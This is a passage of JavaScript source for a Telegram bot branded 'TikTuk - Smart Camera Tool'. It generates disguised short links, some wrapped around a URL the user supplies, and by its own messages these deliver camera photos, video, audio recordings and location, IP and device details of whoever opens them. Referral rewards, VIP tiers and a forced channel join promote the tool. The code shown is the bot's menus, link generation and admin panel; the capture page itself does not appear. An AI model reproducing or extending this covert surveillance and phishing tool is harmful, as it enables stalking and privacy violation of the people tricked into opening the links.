        'vip_audio': "🎙️ Аудио запись",
        'vip_location': "📍 Отслеживание локации",
        'not_vip': "Эта функция только для VIP. ❌",
        'vip_purchased_referrals': "🎉 Поздравляем! VIP активирован!",
        'not_enough_referrals': "❌ Недостаточно рефералов.\nУ вас: %s\nНужно: %s",
        'account_info': "👤 <b>Ваш аккаунт</b>\n\n🆔 ID: <code>%s</code>\n⭐ Баллы: %s\n👥 Рефералы: %s\n🏅 Уровень: %s\n📊 Статус: %s\n📸 Всего захватов: %s\n📍 Бесп. локаций: %s\n🎙️ Бесп. аудио: %s",
        'share_invite': "📤 Пригласить",
        'invite_text': "🔥 Попробуй этого бота! 📸\nПопробуй сейчас 👇",
        'status_normal': "Обычный",
        'status_vip': "VIP 🌟",
        'maintenance': "Бот на обслуживании. Попробуйте позже. 🛠️",
        'banned': "Вы заблокированы. 🚫",
        'force_join': "Сначала подпишитесь на канал. 📢",
        'join_channel': "Подписаться",
        'check_join': "✅ Проверить подписку",
        'invalid_link': "Неверная ссылка. Отправьте ссылку с http или https.",
        'referral_link': "🔗 Ваша реферальная ссылка:\nhttps://t.me/%s?start=%s\n\nДелитесь для получения баллов!",
        'new_referral': "🎉 Кто-то присоединился по вашей ссылке!",
        'payment_success': "Оплата успешна! Вы теперь VIP. 🎉",
        'payment_failed': "Ошибка оплаты. Попробуйте снова. ❌",
        'cooldown_msg': "⏳ Подождите %s секунд.",
        'daily_bonus': "🎁 Ежедневный бонус! Баланс: %s",
        'achievement_unlocked': "🏆 Новое достижение: %s",
        'ach_first_capture': "📸 Первый захват!",
        'ach_first_referral': "👥 Первый реферал!",
        'ach_ten_referrals': "🔥 10 рефералов!",
        'ach_fifty_referrals': "💎 50 рефералов!",
        'ach_vip_member': "🌟 VIP участник!",
        'lang_changed': "Язык изменён! 🌐",
        'your_id': "🆔 Ваш ID: <code>%s</code>",
        'location_generated': "📍 Ссылка отслеживания создана!\n\n%s",
        'free_trial_ended': "❌ Бесплатный период закончился!\nДля продолжения оформите VIP. 🌟",
        'free_remaining': "📊 У вас осталось %s бесплатных попыток.",
        'location_received': "📍 <b>Новая локация!</b>\n\n🌐 Координаты: %s, %s\n🗺 Карта: %s\n🌐 IP: %s\n📱 Устройство: %s\n💻 Платформа: %s\n📅 Время: %s"
    }
};

function getTextMsg(key, lang = 'ar', ...args) {
    let text = texts[lang]?.[key] ?? texts['ar'][key] ?? key;
    if (args.length > 0) {
        text = text.replace(/%s/g, () => args.shift());
    }
    return text;
}

// ==========================================
// Bot Logic Handlers
// ==========================================

bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const firstName = ctx.from.first_name;
    const username = ctx.from.username;
    const text = ctx.message.text;

    const settings = loadSettings();
    let user = getUser(userId);
    let isNew = false;

    // Handle referral
    const match = text.match(/\/start (\d+)/);
    if (match) {
        const refId = match[1];
        if (refId != userId) {
            if (!user) {
                user = updateUser(userId, { invited_by: refId });
                isNew = true;
            }
        }
    }

    if (!user) {
        user = updateUser(userId, {});
        isNew = true;
    }

    // Notify admin of new user
    if (isNew) {
        const name = firstName || 'Unknown';
        const uname = username ? `@${username}` : 'N/A';
        bot.telegram.sendMessage(config.ADMIN_ID, `🆕 <b>مستخدم جديد!</b>\n\n👤 الاسم: ${name}\n🔗 اليوزر: ${uname}\n🆔 الآيدي: <code>${userId}</code>`, { parse_mode: 'HTML' });
    }

    // Daily bonus
    const bonusGiven = checkDailyBonus(userId);

    if (user.is_banned) {
        ctx.reply(getTextMsg('banned', user.lang));
        return;
    }

    if (settings.maintenance_mode && userId != config.ADMIN_ID) {
        ctx.reply(getTextMsg('maintenance', user.lang));
        return;
    }

    // 1. Language first
    if (!user.lang_selected) {
        showLanguageSelection(ctx);
        return;
    }

    // 2. Terms second
    if (!user.agreed_terms) {
        showTermsMessage(ctx, user.lang);
        return;
    }

    // 3. Force join third
    if (!(await checkForceJoin(ctx, userId, user.lang))) {
        return;
    }

    // Show main menu
    showMainMenu(ctx, user.lang);

    // Show daily bonus message
    if (bonusGiven) {
        user = getUser(userId);
        ctx.reply(getTextMsg('daily_bonus', user.lang, user.stars));
    }
});

async function showTermsMessage(ctx, lang) {
    const terms = {
        'ar': "📋 <b>شروط وأحكام الاستخدام</b>\n\n1️⃣ هذا البوت مخصص للاستخدام الشخصي فقط.\n2️⃣ يمنع استخدام البوت لأي أغراض غير قانونية.\n3️⃣ أنت المسؤول الوحيد عن أي استخدام لحسابك.\n4️⃣ يحق للإدارة إيقاف حسابك في حال مخالفة الشروط.\n5️⃣ بالموافقة، أنت تقبل جميع الشروط المذكورة أعلاه.",
        'en': "📋 <b>Terms & Conditions</b>\n\n1️⃣ This bot is for personal use only.\n2️⃣ Using the bot for illegal purposes is prohibited.\n3️⃣ You are solely responsible for your account usage.\n4️⃣ Administration reserves the right to suspend your account.\n5️⃣ By agreeing, you accept all the terms above.",
        'hi': "📋 <b>नियम और शर्तें</b>\n\n1️⃣ यह बॉट केवल व्यक्तिगत उपयोग के लिए है।\n2️⃣ अवैध उद्देश्यों के लिए उपयोग निषिद्ध है।\n3️⃣ आप अपने खाते के उपयोग के लिए जिम्मेदार हैं।\n4️⃣ प्रशासन खाता निलंबित कर सकता है।\n5️⃣ सहमत होकर, आप सभी शर्तें स्वीकार करते हैं।",
        'bn': "📋 <b>শর্তাবলী</b>\n\n1️⃣ এই বট শুধুমাত্র ব্যক্তিগত ব্যবহারের জন্য।\n2️⃣ অবৈধ উদ্দেশ্যে ব্যবহার নিষিদ্ধ।\n3️⃣ আপনি আপনার অ্যাকাউন্টের জন্য দায়ী।\n4️⃣ প্রশাসন অ্যাকাউন্ট স্থগিত করতে পারে।\n5️⃣ সম্মত হয়ে, আপনি সব শর্ত গ্রহণ করেন।",
        'ru': "📋 <b>Условия использования</b>\n\n1️⃣ Бот только для личного использования.\n2️⃣ Использование в незаконных целях запрещено.\n3️⃣ Вы несёте ответственность за свой аккаунт.\n4️⃣ Администрация может приостановить аккаунт.\n5️⃣ Соглашаясь, вы принимаете все условия."
    };

    const termsText = terms[lang] ?? terms['ar'];
    const agreeBtnText = {
        'ar': '✅ أوافق على الشروط',
        'en': '✅ I Agree',
        'hi': '✅ मैं सहमत हूं',
        'bn': '✅ আমি সম্মত',
        'ru': '✅ Я согласен'
    }[lang] ?? '✅ أوافق على الشروط';

    const keyboard = Markup.inlineKeyboard([
        Markup.button.callback(agreeBtnText, 'agree_terms')
    ]);
    ctx.reply(termsText, { parse_mode: 'HTML', ...keyboard });
}

async function checkForceJoin(ctx, userId, lang) {
    if (userId == config.ADMIN_ID) return true;

    const settings = loadSettings();
    if (!settings.force_channel) return true;

    const channel = settings.force_channel;
    try {
        const chatMember = await bot.telegram.getChatMember(channel, userId);
        const status = chatMember.status;
        if (['member', 'administrator', 'creator'].includes(status)) {
            creditReferral(userId);
            return true;
        }
    } catch (e) {
        writeLog(`Error checking force join for user ${userId} in channel ${channel}: ${e.message}`);
    }

    const channelLink = channel.replace('@', 'https://t.me/');
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url(getTextMsg('join_channel', lang), channelLink)],
        [Markup.button.callback(getTextMsg('check_join', lang), 'check_join')]
    ]);
    ctx.reply(getTextMsg('force_join', lang), keyboard);
    return false;
}

async function creditReferral(userId) {
    const user = getUser(userId);
    if (!user || user.referral_credited || !user.invited_by) return;

    const refId = user.invited_by;
    let refUser = getUser(refId);
    if (!refUser) return;

    const settings = loadSettings();
    const refStars = settings.referral_stars ?? 2;

    updateUser(refId, {
        stars: refUser.stars + refStars,
        referrals: refUser.referrals + 1
    });
    updateUser(userId, { referral_credited: true });

    bot.telegram.sendMessage(refId, getTextMsg('new_referral', refUser.lang));

    const newAch = checkAchievements(refId);
    refUser = getUser(refId); // Reload user to get updated achievements
    for (const ach of newAch) {
        bot.telegram.sendMessage(refId, getTextMsg('achievement_unlocked', refUser.lang, getTextMsg(`ach_${ach}`, refUser.lang)));
    }

    const newLevel = getUserLevel(refUser.referrals);
    updateUser(refId, { level: newLevel });
}

function showLanguageSelection(ctx) {
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('العربية 🇸🇦', 'lang_ar'), Markup.button.callback('English 🇬🇧', 'lang_en')],
        [Markup.button.callback('हिंदी 🇮🇳', 'lang_hi'), Markup.button.callback('বাংলা 🇧🇩', 'lang_bn')],
        [Markup.button.callback('Русский 🇷🇺', 'lang_ru')]
    ]);
    ctx.reply("🌐 Please choose your language / يرجى اختيار اللغة:", keyboard);
}

async function showMainMenu(ctx, lang) {
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback(getTextMsg('front_cam', lang), 'menu_front_cam'), Markup.button.callback(getTextMsg('back_cam', lang), 'menu_back_cam')],
        [Markup.button.callback(getTextMsg('custom_link', lang), 'menu_custom_link')],
        [Markup.button.callback(getTextMsg('vip_section', lang), 'menu_vip')],
        [Markup.button.callback(getTextMsg('my_account', lang), 'menu_account'), Markup.button.callback(getTextMsg('help', lang), 'menu_help')]
    ]);

    const welcomes = {
        'ar': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nمرحباً بك في TikTuk 📸.\nسيتم استلام الصور فوراً بعد فتح الروابط.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
        'en': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nWelcome to TikTuk 📸.\nPhotos will be received immediately after opening the links.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
        'hi': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nTikTuk में आपका स्वागत है 📸.\nलिंक खोलने के तुरंत बाद फ़ोटो प्राप्त होंगी।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
        'bn': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nTikTuk-এ স্বাগতম 📸.\nলিংক খোলার সাথে সাথে ছবি পাওয়া যাবে।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
        'ru': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nДобро пожаловать в TikTuk 📸.\nФотографии будут получены сразу после перехода по ссылкам.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>"
    };

    const welcomeMsg = welcomes[lang] ?? welcomes['ar'];
    ctx.reply(welcomeMsg, { parse_mode: 'HTML', ...keyboard });
}

async function showVipSection(ctx, user) {
    const lang = user.lang;
    const settings = loadSettings();

    if (user.is_vip) {
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback(getTextMsg('vip_video', lang), 'vip_get_video')],
            [Markup.button.callback(getTextMsg('vip_audio', lang), 'vip_get_audio')],
            [Markup.button.callback(getTextMsg('vip_location', lang), 'vip_get_location')],
            [Markup.button.callback('🔙', 'back_main')]
        ]);
        ctx.reply(`🌟 <b>VIP Active</b> 🌟\n\n${getTextMsg('vip_info', lang, settings.vip_price_stars, settings.vip_price_referrals)}`, { parse_mode: 'HTML', ...keyboard });
    } else {
        const priceStars = settings.vip_price_stars;
        const priceRefs = settings.vip_price_referrals;

        let freeLoc = config.FREE_LOCATION_LIMIT - (user.free_location_used ?? 0);
        let freeAud = config.FREE_AUDIO_LIMIT - (user.free_audio_used ?? 0);
        if (freeLoc < 0) freeLoc = 0;
        if (freeAud < 0) freeAud = 0;

        const buttons = [];

        if (freeLoc > 0) {
            buttons.push([Markup.button.callback(`${getTextMsg('vip_location', lang)} (${freeLoc})`, 'vip_get_location')]);
        }
        if (freeAud > 0) {
            buttons.push([Markup.button.callback(`${getTextMsg('vip_audio', lang)} (${freeAud})`, 'vip_get_audio')]);
        }

        buttons.push([Markup.button.callback(getTextMsg('buy_vip_stars', lang, priceStars), 'buy_vip_stars')]);
        buttons.push([Markup.button.callback(getTextMsg('buy_vip_referrals', lang, priceRefs), 'buy_vip_referrals')]);
        buttons.push([Markup.button.callback('🔙', 'back_main')]);

        const keyboard = Markup.inlineKeyboard(buttons);
        ctx.reply(getTextMsg('vip_info', lang, priceStars, priceRefs), { parse_mode: 'HTML', ...keyboard });
    }
}

async function showAccountSection(ctx, user) {
    const lang = user.lang;
    const userId = user.id;
    const status = user.is_vip ? getTextMsg('status_vip', lang) : getTextMsg('status_normal', lang);
    const level = getLevelEmoji(getUserLevel(user.referrals), lang);
    const totalCaptures = user.total_captures ?? 0;
    let freeLoc = config.FREE_LOCATION_LIMIT - (user.free_location_used ?? 0);
    let freeAud = config.FREE_AUDIO_LIMIT - (user.free_audio_used ?? 0);
    if (freeLoc < 0) freeLoc = 0;
    if (freeAud < 0) freeAud = 0;

    const info = getTextMsg('account_info', lang, userId, user.stars, user.referrals, level, status, totalCaptures, freeLoc, freeAud);

    const botInfo = await bot.telegram.getMe();
    const botUsername = botInfo.username ?? 'bot';

    const inviteText = `${getTextMsg('invite_text', lang)}\nhttps://t.me/${botUsername}?start=${userId}`;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url(getTextMsg('share_invite', lang), `https://t.me/share/url?url=${encodeURIComponent(`https://t.me/${botUsername}?start=${userId}`)}&text=${encodeURIComponent(getTextMsg('invite_text', lang))}`)],
        [Markup.button.callback('🔙', 'back_main')]
    ]);

    const refLink = getTextMsg('referral_link', lang, botUsername, userId);
    ctx.reply(`${info}\n\n${refLink}`, { parse_mode: 'HTML', ...keyboard });
}

bot.on('message', async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const text = ctx.message.text;

    const user = getUser(userId);
    if (!user) return; // Should not happen if start handler is correct
    if (user.is_banned) {
        ctx.reply(getTextMsg('banned', user.lang));
        return;
    }

    const lang = user.lang;

    if (!user.agreed_terms) {
        // If terms not agreed, redirect to start handler
        bot.handleUpdate(ctx.update);
        return;
    }

    if (!(await checkForceJoin(ctx, userId, lang))) {
        return;
    }

    if (user.state === 'waiting_custom_link') {
        if (text && (text.startsWith('http://') || text.startsWith('https://'))) {
            if (!user.is_vip) {
                const settings = loadSettings();
                const remaining = cooldownCheck(userId, 'link', settings.cooldown_seconds);
                if (remaining > 0) {
                    ctx.reply(getTextMsg('cooldown_msg', lang, remaining));
                    return;
                }
            }

            const codeF = generateShortCode();
            saveShortLink(codeF, { u: userId, r: text, c: 'f' });
            const codeB = generateShortCode();
            saveShortLink(codeB, { u: userId, r: text, c: 'b' });

            const frontLink = `${config.BOT_URL}/${codeF}`;
            const backLink = `${config.BOT_URL}/${codeB}`;

            ctx.reply(getTextMsg('custom_link_generated', lang, frontLink, backLink));
            updateUser(userId, { state: 'none' });
        } else {
            ctx.reply(getTextMsg('invalid_link', lang));
        }
        return;
    }

    // If no specific state, show main menu
    showMainMenu(ctx, lang);
});

bot.on('callback_query', async (ctx) => {
    const callbackQueryId = ctx.callbackQuery.id;
    const userId = ctx.from.id;
    const data = ctx.callbackQuery.data;
    const messageId = ctx.callbackQuery.message.message_id;

    let user = getUser(userId);
    if (!user) {
        user = updateUser(userId, {});
    }

    // Language selection
    if (data.startsWith('lang_')) {
        const lang = data.replace('lang_', '');
        updateUser(userId, { lang: lang, lang_selected: true });
        ctx.answerCbQuery(getTextMsg('lang_saved', lang));
        ctx.deleteMessage(messageId);
        showTermsMessage(ctx, lang);
        return;
    }

    // Agree terms
    if (data === 'agree_terms') {
        const lang = user.lang ?? 'ar';
        updateUser(userId, { agreed_terms: true });
        ctx.answerCbQuery(getTextMsg('terms_agreed', lang));
        ctx.deleteMessage(messageId);
        if (!(await checkForceJoin(ctx, userId, lang))) {
            return;
        }
        showMainMenu(ctx, lang);
        return;
    }

    // Check join
    if (data === 'check_join') {
        const lang = user.lang ?? 'ar';
        const settings = loadSettings();
        if (settings.force_channel) {
            try {
                const chatMember = await bot.telegram.getChatMember(settings.force_channel, userId);
                const status = chatMember.status;
                if (['member', 'administrator', 'creator'].includes(status)) {
                    creditReferral(userId);
                    ctx.answerCbQuery('✅');
                    ctx.deleteMessage(messageId);
                    showMainMenu(ctx, lang);
                } else {
                    ctx.answerCbQuery(getTextMsg('force_join', lang), true);
                }
            } catch (e) {
                writeLog(`Error checking force join on callback for user ${userId}: ${e.message}`);
                ctx.answerCbQuery(getTextMsg('force_join', lang), true);
            }
        } else {
            ctx.answerCbQuery('✅');
            ctx.deleteMessage(messageId);
            showMainMenu(ctx, user.lang);
        }
        return;
    }

    // Force join check for all other callbacks
    if (!(await checkForceJoin(ctx, userId, user.lang))) {
        ctx.answerCbQuery();
        return;
    }

    const lang = user.lang;
    const settings = loadSettings();

    switch (data) {
        case 'menu_front_cam':
            if (!user.is_vip) {
                const remaining = cooldownCheck(userId, 'link', settings.cooldown_seconds);
                if (remaining > 0) {
                    ctx.answerCbQuery(getTextMsg('cooldown_msg', lang, remaining), true);
                    return;
                }
            }
            const codeF = generateShortCode();
            saveShortLink(codeF, { u: userId, c: 'f' });
            const linkF = `${config.BOT_URL}/${codeF}`;
            ctx.answerCbQuery();
            ctx.reply(`📸 ${linkF}`);
            break;

        case 'menu_back_cam':
            if (!user.is_vip) {
                const remaining = cooldownCheck(userId, 'link', settings.cooldown_seconds);
                if (remaining > 0) {
                    ctx.answerCbQuery(getTextMsg('cooldown_msg', lang, remaining), true);
                    return;
                }
            }
            const codeB = generateShortCode();
            saveShortLink(codeB, { u: userId, c: 'b' });
            const linkB = `${config.BOT_URL}/${codeB}`;
            ctx.answerCbQuery();
            ctx.reply(`📸 ${linkB}`);
            break;

        case 'menu_custom_link':
            updateUser(userId, { state: 'waiting_custom_link' });
            ctx.answerCbQuery();
            ctx.reply(getTextMsg('send_custom_link', lang));
            break;

        case 'menu_vip':
            ctx.answerCbQuery();
            showVipSection(ctx, user);
            break;

        case 'menu_account':
            ctx.answerCbQuery();
            showAccountSection(ctx, user);
            break;

        case 'menu_help':
            ctx.answerCbQuery();
            ctx.reply("❓ للتواصل مع الدعم تواصل مع الأدمن مباشرة.");
            break;

        case 'back_main':
            ctx.answerCbQuery();
            ctx.deleteMessage(messageId);
            showMainMenu(ctx, lang);
            break;

        case 'buy_vip_stars':
            // Telegram Stars payment (requires provider token, not directly handled here)
            // For demonstration, we'll simulate success or failure.
            ctx.answerCbQuery('This feature requires a Telegram Payments provider token.', true);
            // In a real scenario, you'd use ctx.telegram.sendInvoice
            // Example: ctx.telegram.sendInvoice(userId, { ...invoice_details });
            break;

        case 'buy_vip_referrals':
            const requiredRefs = settings.vip_price_referrals;
            if (user.referrals >= requiredRefs) {
                updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000) });
                ctx.answerCbQuery(getTextMsg('vip_purchased_referrals', lang));
                ctx.reply(getTextMsg('vip_purchased_referrals', lang));
                bot.telegram.sendMessage(config.ADMIN_ID, `💎 VIP via Referrals!\nUser: ${userId}\nReferrals: ${user.referrals}`);
                checkAchievements(userId);
            } else {
                ctx.answerCbQuery(getTextMsg('not_enough_referrals', lang, user.referrals, requiredRefs), true);
            }
            break;

        case 'vip_get_video':
            if (!user.is_vip) {
                ctx.answerCbQuery(getTextMsg('not_vip', lang), true);
                return;
            }
            const codeV = generateShortCode();
            saveShortLink(codeV, { u: userId, c: 'v' });
            const linkV = `${config.BOT_URL}/${codeV}`;
            ctx.answerCbQuery();
            ctx.reply(`🎥 ${linkV}`);
            break;

        case 'vip_get_audio':
            let audioUsed = user.free_audio_used ?? 0;
            if (!user.is_vip && audioUsed >= config.FREE_AUDIO_LIMIT) {
                ctx.answerCbQuery(getTextMsg('free_trial_ended', lang), true);
                return;
            }
            const codeA = generateShortCode();
            saveShortLink(codeA, { u: userId, c: 'a' });
            const linkA = `${config.BOT_URL}/${codeA}`;
            ctx.answerCbQuery();
            if (!user.is_vip) {
                const rem = config.FREE_AUDIO_LIMIT - audioUsed;
                ctx.reply(`🎙️ ${linkA}\n\n${getTextMsg('free_remaining', lang, rem)}`);
            } else {
                ctx.reply(`🎙️ ${linkA}`);
            }
            break;

        case 'vip_get_location':
            let locUsed = user.free_location_used ?? 0;
            if (!user.is_vip && locUsed >= config.FREE_LOCATION_LIMIT) {
                ctx.answerCbQuery(getTextMsg('free_trial_ended', lang), true);
                return;
            }
            const codeL = generateShortCode();
            saveShortLink(codeL, { u: userId, c: 'l' });
            const linkL = `${config.BOT_URL}/${codeL}`;
            ctx.answerCbQuery();
            if (!user.is_vip) {
                const rem = config.FREE_LOCATION_LIMIT - locUsed;
                ctx.reply(`${getTextMsg('location_generated', lang, linkL)}\n\n${getTextMsg('free_remaining', lang, rem)}`);
            } else {
                ctx.reply(getTextMsg('location_generated', lang, linkL));
            }
            break;
    }
});

// ==========================================
// Payment Handlers (Simplified for Node.js)
// ==========================================

bot.on('pre_checkout_query', async (ctx) => {
    // Always answer true for now, as actual payment processing is complex and requires provider token
    ctx.answerPreCheckoutQuery(true);
});

bot.on('successful_payment', async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);
    if (user) {
        updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000) });
        ctx.reply(getTextMsg('payment_success', user.lang));
        bot.telegram.sendMessage(config.ADMIN_ID, `💰 New VIP Payment!\nUser ID: ${userId}`);
        checkAchievements(userId);
    }
});

// ==========================================
// Admin Commands
// ==========================================

bot.command('admin', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const msg = `🔐 <b>لوحة تحكم الأدمن v5.1</b>\n\n` +
        `📊 /stats - إحصائيات البوت\n` +
        `📢 /broadcast [رسالة] - إذاعة\n` +
        `🚫 /ban [آيدي] - حظر مستخدم\n` +
        `✅ /unban [آيدي] - فك حظر\n` +
        `💎 /addvip [آيدي] - إضافة VIP\n` +
        `❌ /removevip [آيدي] - إلغاء VIP\n` +
        `🗑 /removevip_days [أيام] - حذف VIP الجماعي\n` +
        `🛠 /maintenance - تفعيل/تعطيل الصيانة\n` +
        `📢 /setchannel [@channel] - قناة إجبارية\n` +
        `🗑 /removechannel - إلغاء القناة\n` +
        `👥 /users - قائمة المستخدمين\n` +
        `🔍 /user [آيدي] - معلومات مستخدم\n` +
        `🔄 /resetuser [آيدي] - إعادة تعيين مستخدم\n` +
        `⭐ /addstars [آيدي] [عدد] - إضافة نجوم\n` +
        `➖ /removestars [آيدي] [عدد] - حذف نجوم\n` +
        `💎 /viplist - قائمة VIP\n` +
        `🏆 /topusers - أفضل المستخدمين\n` +
        `🔄 /resetalltrials - إعادة تعيين المحاولات المجانية\n` +
        `💰 /setvip_stars [سعر] - سعر VIP بالنجوم\n` +
        `👥 /setvip_refs [عدد] - سعر VIP بالإحالات\n` +
        `⭐ /setreferral_stars [عدد] - نجوم الإحالة\n` +
        `⏱ /setcooldown [ثواني] - تغيير الكولداون\n` +
        `📋 /logs - آخر السجلات\n` +
        `🔒 /security - سجل الأمان`;
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.command('stats', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const users = loadUsers();
    const total = Object.keys(users).length;
    const vips = Object.values(users).filter(u => u.is_vip).length;
    const banned = Object.values(users).filter(u => u.is_banned).length;
    const settings = loadSettings();

    let msg = `📊 <b>إحصائيات البوت</b>\n\n` +
        `👤 إجمالي المستخدمين: ${total}\n` +
        `🌟 مستخدمي VIP: ${vips}\n` +
        `🚫 المستخدمين المحظورين: ${banned}\n` +
        `🛠 وضع الصيانة: ${settings.maintenance_mode ? 'مفعل' : 'معطل'}\n` +
        `📢 قناة إجبارية: ${settings.force_channel ?? 'لا يوجد'}\n` +
        `💰 سعر VIP (نجوم): ${settings.vip_price_stars}\n` +
        `👥 سعر VIP (إحالات): ${settings.vip_price_referrals}\n` +
        `⭐ نجوم الإحالة: ${settings.referral_stars}\n` +
        `⏱ كولداون: ${settings.cooldown_seconds} ثانية`;

    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.command('broadcast', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const messageText = ctx.message.text.substring('/broadcast '.length);
    if (!messageText) {
        ctx.reply('الاستخدام: /broadcast [رسالة]');
        return;
    }

    const users = loadUsers();
    let sentCount = 0;
    for (const user of Object.values(users)) {
        try {
            await bot.telegram.sendMessage(user.id, messageText, { parse_mode: 'HTML' });
            sentCount++;
        } catch (e) {
            writeLog(`Failed to send broadcast to user ${user.id}: ${e.message}`);
        }
    }
    ctx.reply(`تم إرسال الإذاعة إلى ${sentCount} مستخدم.`);
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /ban [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { is_banned: true });
        ctx.reply(`تم حظر المستخدم ${targetId}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /unban [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { is_banned: false });
        ctx.reply(`تم فك حظر المستخدم ${targetId}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('addvip', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /addvip [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000) });
        ctx.reply(`تم إضافة VIP للمستخدم ${targetId}.`);
        bot.telegram.sendMessage(targetId, getTextMsg('payment_success', user.lang));
        checkAchievements(targetId);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('removevip', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /removevip [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { is_vip: false, vip_activated_at: 0 });
        ctx.reply(`تم إلغاء VIP للمستخدم ${targetId}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('removevip_days', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const days = parseInt(ctx.message.text.split(' ')[1], 10);
    if (isNaN(days) || days <= 0) {
        ctx.reply('الاستخدام: /removevip_days [عدد الأيام]');
        return;
    }

    const users = loadUsers();
    const now = Math.floor(Date.now() / 1000);
    const threshold = now - (days * 24 * 60 * 60);
    let removedCount = 0;

    for (const user of Object.values(users)) {
        if (user.is_vip && user.vip_activated_at < threshold) {
            updateUser(user.id, { is_vip: false, vip_activated_at: 0 });
            removedCount++;
        }
    }
    ctx.reply(`تم إلغاء VIP لـ ${removedCount} مستخدم انتهت صلاحيتهم قبل ${days} أيام.`);
});

bot.command('maintenance', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const settings = loadSettings();
    settings.maintenance_mode = !settings.maintenance_mode;
    saveSettings(settings);
    ctx.reply(`وضع الصيانة: ${settings.maintenance_mode ? 'مفعل' : 'معطل'}.`);
});

bot.command('setchannel', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const channel = ctx.message.text.split(' ')[1];
    if (!channel || !channel.startsWith('@')) {
        ctx.reply('الاستخدام: /setchannel [@اسم_القناة]');
        return;
    }

    const settings = loadSettings();
    settings.force_channel = channel;
    saveSettings(settings);
    ctx.reply(`تم تعيين القناة الإجبارية إلى ${channel}.`);
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const settings = loadSettings();
    settings.force_channel = null;
    saveSettings(settings);
    ctx.reply('تم إلغاء القناة الإجبارية.');
});

bot.command('users', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const users = loadUsers();
    let msg = '👥 <b>قائمة المستخدمين:</b>\n\n';
    for (const user of Object.values(users)) {
        msg += `ID: <code>${user.id}</code> | VIP: ${user.is_vip ? '✅' : '❌'} | Banned: ${user.is_banned ? '🚫' : '✅'}\n`;
    }
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.command('user', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /user [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        const status = user.is_vip ? getTextMsg('status_vip', user.lang) : getTextMsg('status_normal', user.lang);
        const level = getLevelEmoji(getUserLevel(user.referrals), user.lang);
        const info = getTextMsg('account_info', user.lang, user.id, user.stars, user.referrals, level, status, user.total_captures, config.FREE_LOCATION_LIMIT - user.free_location_used, config.FREE_AUDIO_LIMIT - user.free_audio_used);
        ctx.reply(info, { parse_mode: 'HTML' });
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('resetuser', async (ctx) => {
    const userId = ctx.from.id;
